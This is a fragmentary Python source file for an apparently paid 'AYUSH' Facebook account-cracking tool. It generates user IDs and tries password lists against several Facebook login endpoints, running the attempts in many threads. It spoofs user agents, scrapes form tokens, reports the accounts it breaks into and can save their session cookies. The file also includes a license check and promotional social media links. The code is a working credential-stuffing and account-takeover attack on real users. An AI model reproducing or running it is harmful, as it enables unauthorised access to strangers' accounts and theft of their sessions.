...
for agenku in range(10000):
  ...
  i='Mobile Safari/537.36 [AYUSH_IAB/AYUSH4A;AYUSHAV/399.0.0.24.93;]'
...
|/     \|   \_/   (_______)\_______)|/     \|
   ...
   {H}    {P}[{H}•{P}] Author    :{warna} AYUSH                  {N}{H}
  {H}     {P}[{H}•{P}] Facebook  : {H} AYUSH KUMAR            {N}{H}    
  ...
  {H}     {P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     
   ...
   {M}                                                                                                             {P}""")
    print(f"""{GREEN}    AYUSH DON{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}  {H} The  AYUSH Is BACK 
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/AYUSH-HEROO/AYUSH-main/PAID.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.link/vk60sz')
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract AYUSH-AYUSH')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://chat.whatsapp.com/JoqwV7fWlulAM8kXvYMHWB");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://t.me/G_m2U9nOxqlkOGVl");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}AYUSH-AYUSH {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=100001353923725");time.sleep(3);os.system('xdg-open https://www.facebook.com/profile.php?id=100001353923725');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100001353923725");mainx()
def mainx2():
    os.system("clear")
    banner()
    ...
    if mahin in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/AYUSH.AYUSH.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as AYUSH_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:AYUSH_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:AYUSH_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:AYUSH_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:AYUSH_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:AYUSH_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:AYUSH_xd.submit(f1,idf,pwv)
            else:
               AYUSH_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as AYUSH_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:AYUSH_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:AYUSH_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:AYUSH_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:AYUSH_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:AYUSH_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:AYUSH_xd.submit(f1,idf,pwv)
      else:
       AYUSH_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as AYUSH_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:AYUSH_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:AYUSH_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:AYUSH_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:AYUSH_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:AYUSH_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python AYUSH-AYUSH.py')
...
def x6():
  ...
  with tred(max_workers=30) as AYUSH_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:AYUSH_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:AYUSH_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:AYUSH_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:AYUSH_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:AYUSH_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:AYUSH_xd.submit(f1,idf,pwv)
  ...
  with tred(max_workers=30) as AYUSH_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:AYUSH_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:AYUSH_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:AYUSH_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:AYUSH_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:AYUSH_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:AYUSH_xd.submit(f1,idf,pwv)
      else:
       AYUSH_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python AYUSH-AYUSH.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mAYUSH","\x1b[1;92mAYUSH","\x1b[1;93mAYUSH","\x1b[1;94mAYUSH","\x1b[1;95mAYUSH","\x1b[1;96mAYUSH","\x1b[1;97mAYUSH","\x1b[1;91mAYUSH","\x1b[1;92mAYUSH","\x1b[1;93mAYUSH","\x1b[1;94mAYUSH","\x1b[1;95mAYUSH","\x1b[1;96mAYUSH"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mAYUSH-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}AYUSH-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
...
def m2(idf,pwv):
 ...
 for pw in pwv:
  try:
   ...
   p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522AYUSHLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522AYUSHLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26AYUSHapp_pres%3D0%26logger_id%3Db97ff6AYUSH-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522AYUSHLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522AYUSHLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=AYUSHconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&AYUSHapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
 ...
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  ...
  for pw in pwv:
    try:
      ...
      "x-AYUSH-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
...
ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [AYUSHAN/MessengerLite;AYUSHAV/{versi_chrome};AYUSHPN/com.facebook.mlite;AYUSHLC/en_US;AYUSHBV/{versi_app};AYUSHCR/3;AYUSHMF/huawei;AYUSHBD/huawei;AYUSHDV/{device.split(' Build')[0]};AYUSHSV/{str(random.randint(4,10))};AYUSHCA/arm64-v8a:null;AYUSHDM/"+str(density)+";]"
...
def m3(idf,pw):
 ...
 try:
  for ps in pw:
   session = requests.Session()
   pro = random.choice(ugen)
   free_AYUSH = session.get(f'https://free.facebook.com').text
   log_data = {
    "lsd":re.search('name="lsd" value="(.*?)"', str(free_AYUSH)).group(1),
   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_AYUSH)).group(1),
   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_AYUSH)).group(1),
   "li":re.search('name="li" value="(.*?)"', str(free_AYUSH)).group(1),
   "try_number":"0",
   "unrecognized_tries":"0",
   "email":idf,
   "pass":ps,
   "login":"Log In"}
   header_freeAYUSH = {'authority':'web.facebook.com',
            'method': 'POST',
            'scheme': 'https',
   ...
   lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freeAYUSH).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [AYUSH-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mAYUSH-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
 ...
 try:
  for ps in pw:
   session = requests.Session()
            ...
            #sys.stdout.flush()
   pro = random.choice(ugen)
   free_AYUSH = session.get('https://m.facebook.com').text
   log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_AYUSH)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_AYUSH)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_AYUSH)).group(1),
   ...
   header_freeAYUSH = {
            ...
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freeAYUSH).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
